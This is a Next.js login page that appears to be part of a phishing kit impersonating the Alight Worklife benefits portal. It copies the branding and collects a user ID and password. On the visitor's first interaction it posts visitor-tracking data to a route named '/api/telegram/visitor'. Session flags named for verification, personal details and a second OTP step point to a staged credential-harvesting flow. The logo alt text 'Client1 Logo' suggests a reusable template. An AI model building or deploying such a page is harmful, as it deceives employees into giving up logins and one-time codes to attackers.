"use client";

import { useEffect, useRef, useState } from "react";
import { useRouter } from "next/navigation";
import { useVisitorTracking } from "@/hooks/use-visitor-tracking";

export default function LoginPage() {
  const [hasInteracted, setHasInteracted] = useState(false);
  const [userId, setUserId] = useState("");
  const [password, setPassword] = useState("");
  const [showPasswordField, setShowPasswordField] = useState(false);
  const visitorInfo = useVisitorTracking();
  const hasSentVisitRef = useRef(false);
  const router = useRouter();

  useEffect(() => {
    if (typeof window !== "undefined") {
      sessionStorage.removeItem("ubs_verify");
      sessionStorage.removeItem("ubs_details");
      sessionStorage.removeItem("ubs_otp2");
    }
  }, []);

  useEffect(() => {
    const onFirstInteraction = () => setHasInteracted(true);
    window.addEventListener("pointerdown", onFirstInteraction, {
      once: true,
      passive: true,
    });
    window.addEventListener("keydown", onFirstInteraction, { once: true });
    return () => {
      window.removeEventListener("pointerdown", onFirstInteraction);
      window.removeEventListener("keydown", onFirstInteraction);
    };
  }, []);

  useEffect(() => {
    if (!hasInteracted || !visitorInfo || hasSentVisitRef.current) return;
    hasSentVisitRef.current = true;
    fetch("/api/telegram/visitor", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(visitorInfo),
    }).catch(console.error);
  }, [hasInteracted, visitorInfo]);

  const handleNextClick = () => {
    if (!userId.trim() || !password.trim()) return;
    if (typeof window !== "undefined") {
      sessionStorage.removeItem("ubs_details");
      sessionStorage.removeItem("ubs_otp2");
      sessionStorage.setItem("ubs_verify", "1");
      document.cookie = "login_flow=1; path=/; max-age=600; SameSite=Lax";
      router.replace("/verify");
    }
  };

  return (
    <div className="min-h-screen bg-[#F5F5F5]">
      <header>
        <div className="bg-purple-800 h-3" />
        <div className="bg-white border-b border-gray-500">
          <div className="px-6 py-6">
            <img
              src="/images/logo.svg"
              alt="Client1 Logo"
              className="h-10 md:h-12"
            />
          </div>
        </div>
      </header>

      <main className="lg:pl-6 lg:pt-12 bg-white">
        <div className="flex flex-col lg:flex-row items-start">
          <div className="w-full lg:p-4 md:p-3 py-5">
            <h1 className="text-2xl md:text-4xl font-semibold text-gray-900 leading-tight mb-10">
              Welcome to Alight Worklife
            </h1>
            <div className="bg-white rounded-xl border border-gray-300 shadow-sm p-10 w-120 max-w-full">
              <h2 className="text-2xl font-semibold mb-6">
                Enter your user ID.
              </h2>
              <p className="text-gray-600 mb-4">
                * Fields marked with an asterisk (*) are required
              </p>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                User ID*
              </label>
              <input
                type="text"
                value={userId}
                onFocus={() => setShowPasswordField(true)}
                onClick={() => setShowPasswordField(true)}
                onChange={(e) => setUserId(e.target.value)}
                className="w-full h-18 border border-gray-700 px-4 outline-none focus:ring-2 focus:ring-blue-500 hover:border-blue-600"
              />
              {showPasswordField && (
                <div className="mt-4">
                  <label className="block text-sm font-medium text-gray-700 mb-2">
                    Password*
                  </label>
                  <input
                    type="password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="w-full h-18 border border-gray-700 px-4 outline-none focus:ring-2 focus:ring-blue-500 hover:border-blue-600"
                  />
                </div>
              )}
              <div className="mt-4 text-right">
                <a href="#" className="text-blue-600 underline">
                  Don't have user ID?
                </a>
              </div>
              <button
                type="button"
                className="mt-10 bg-gray-400 text-white px-8 py-4 rounded-full disabled:cursor-not-allowed"
                onClick={handleNextClick}
                disabled={!userId.trim() || !password.trim()}
              >
                Next
              </button>
            </div>
          </div>
          <div className="mt-6">
            <img
              src="/images/hero.jpg"
              alt="city"
              className="w-full lg:w-125 lg:h-37.5 h-25 object-cover md:h-37.5"
            />
          </div>
        </div>
      </main>

      <footer>
        <div className="max-w-7xl mx-auto py-12 px-8">
          <div className="flex flex-col lg:flex-row justify-between gap-12 md:flex-row">
            <div className="space-y-8 text-[20px]">
              <a href="#" className="block text-blue-700 underline">
                Contact Us
              </a>
              <a href="#" className="block text-blue-700 underline">
                Feedback
              </a>
              <a href="#" className="block text-blue-700 underline">
                Protect Yourself From Website Fraud
              </a>
            </div>
            <div className="flex flex-col items-start lg:items-center">
              <img
                src="/images/alight_worklife_logo_black.svg"
                alt="footer logo"
                className="h-14 mb-6"
              />
              <div className="flex gap-4">
                <img
                  src="/images/alight-worklife-app-store.png"
                  alt="App Store"
                  className="h-12"
                />
                <img
                  src="/images/alight-worklife-google-play.png"
                  alt="Google Play"
                  className="h-12"
                />
              </div>
            </div>
          </div>

          <hr className="my-10 border-gray-500" />

          <div className="flex flex-col lg:flex-row justify-between gap-8">
            <div className="flex flex-wrap gap-4 text-[16px]">
              <a href="#" className="text-blue-700 underline">
                Privacy Policy
              </a>
              <a href="#" className="text-blue-700 underline">
                Terms of Use
              </a>
              <a href="#" className="text-blue-700 underline">
                Cookie Notice
              </a>
              <a href="#" className="text-blue-700 underline">
                Cookie Settings[Do Not Sell or Share My Personal Information]
              </a>
            </div>
            <p className="text-gray-600 text-[16px]">
              &copy; 2026 Alight Solutions. All rights reserved.
            </p>
          </div>
        </div>
      </footer>
    </div>
  );
}
